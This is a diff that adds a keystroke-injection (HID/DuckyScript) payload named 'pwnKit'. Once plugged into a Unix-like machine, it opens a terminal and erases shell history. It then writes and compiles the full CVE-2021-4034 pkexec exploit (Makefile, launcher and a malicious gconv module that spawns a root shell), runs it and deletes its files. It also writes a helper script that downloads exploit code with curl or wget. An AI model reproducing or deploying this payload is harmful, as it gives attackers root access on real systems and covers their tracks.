@@ -1,0 +1,34 @@
+REM Title: pwnKit
+REM Description: Privilege escalation in Unix-like operating systems
+REM Author: drapl0n
+REM Version: 1.0
+REM Category: Privilege Escalation
+REM Target: Unix-like operating systems
+REM Attackmodes: HID
+
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 400
+STRING mkdir /tmp/pwn && cd /tmp/pwn
+ENTER
+DELAY 400
+STRING echo -e '"CFLAGS=-Wall\nTRUE=$(shell which true)\n\n.PHONY: all\nall: pwnkit.so cve-2021-4034 gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./\n\tmake -C dry-run clean\n\ngconv-modules:\n\techo "module UTF-8// PWNKIT// pwnkit 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp -f $(TRUE) GCONV_PATH=./pwnkit.so:.\n\npwnkit.so: pwnkit.c\n\t$(CC) $(CFLAGS) --shared -fPIC -o $@ $<\n\n.PHONY: dry-run\ndry-run:\n\tmake -C dry-run"' > Makefile
+ENTER
+DELAY 400
+STRING echo -e "#include <unistd.h>\n\nint main(int argc, char **argv)\n{\n\tchar * const args[] = {\n\t\tNULL\n\t};\n\tchar * const environ[] = {\n\t\t"\"pwnkit.so:.\"",\n\t\t"\"PATH=GCONV_PATH=.\"",\n\t\t"\"SHELL=/lol/i/do/not/exists\"",\n\t\t"\"CHARSET=PWNKIT\"",\n\t\t"\"GIO_USE_VFS=\"",\n\t\tNULL\n\t};\n\treturn execve("\"/usr/bin/pkexec\"", args, environ);\n}" > cve-2021-4034.c
+ENTER
+DELAY 400
+STRING echo -e ""'#!/usr/bin/env sh\n\nURL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'\n\nfor EXPLOIT in "${URL}/cve-2021-4034.c" "${URL}/pwnkit.c" "${URL}/Makefile"\ndo\n\tcurl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"\ndone\n\nmake\n\n./cve-2021-4034'"" > cve-2021-4034.sh
+ENTER
+DELAY 400
+STRING echo -e "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid gconv(void) {\n}\n\nvoid gconv_init(void *step)\n{\n\tchar * const args[] = { "\"/bin/sh\"", NULL };\n\tchar * const environ[] = { "\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin\"", NULL };\n\tsetuid(0);\n\tsetgid(0);\n\texecve(args[0], args, environ);\n\texit(0);\n}" > pwnkit.c
+ENTER
+DELAY 200
+STRING make && ./cve-2021-4034
+ENTER
+DELAY 4000
+STRING rm -rf /tmp/pwn
+ENTER
